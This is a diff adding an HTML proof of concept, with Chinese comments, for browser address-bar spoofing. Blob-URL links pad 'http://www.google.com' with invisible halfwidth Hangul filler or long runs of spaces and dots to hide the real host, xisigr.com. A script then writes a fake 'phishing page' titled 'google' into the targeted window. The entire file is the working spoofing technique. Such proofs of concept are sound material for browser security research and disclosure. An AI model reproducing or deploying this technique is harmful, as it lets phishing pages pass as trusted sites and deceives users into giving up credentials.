@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script>
+        function pwned() {
+            // 打开一个名为 'ss' 的新窗口
+            var t = window.open('', 'ss');
+            // 向新窗口的文档写入 HTML 内容
+            t.document.write('<h1>phishing page</h1><title>google</title>');
+            // 停止页面的进一步加载
+            t.stop();
+        }
+    </script>
+</head>
+<body>
+    <!-- 点击后在 500 毫秒后调用 pwned 函数 -->
+    <a href="blob:http://www.google.com%EF%BE%A0............@xisigr.com" 
+       target="ss" 
+       onclick="setTimeout(pwned, 500)">
+       click me1
+    </a>
+    <br><br>
+    <!-- 点击后在 500 毫秒后调用 pwned 函数 -->
+    <a href="blob:http://www.google.com        ............@xisigr.com" 
+       target="ss" 
+       onclick="setTimeout(pwned, 500)">
+       click me2
+    </a>
+</body>
+</html>
